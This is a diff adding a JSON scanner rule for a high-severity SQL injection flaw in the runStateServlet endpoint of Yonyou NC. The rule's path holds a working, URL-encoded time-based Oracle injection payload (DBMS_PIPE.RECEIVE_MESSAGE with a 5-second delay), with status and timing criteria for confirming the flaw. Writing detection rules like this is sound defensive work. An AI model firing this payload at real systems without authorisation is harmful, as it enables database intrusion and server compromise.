@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友NC /portal/pt/servlet/runStateServlet接口存在SQL注入漏洞",
+    "level": "高危",
+    "description": "攻击者通过执行数据库命令获取服务器权限",
+    "product": "用友NC",
+    "version": "NC version<=6.5",
+    "cve": "无",
+    "reference": "暂无",
+    "fixing": "过滤参数",
+    "rule": {
+        "path": "/portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'%20AND%206371%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28107%29%7C%7CCHR%2866%29%7C%7CCHR%28105%29%7C%7CCHR%2889%29%2C5%29--",
+        "method": "GET",
+        "headers": "",
+        "body": "",
+        "status_code": "500",
+        "keywords": "html",
+        "res_time": "5"
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
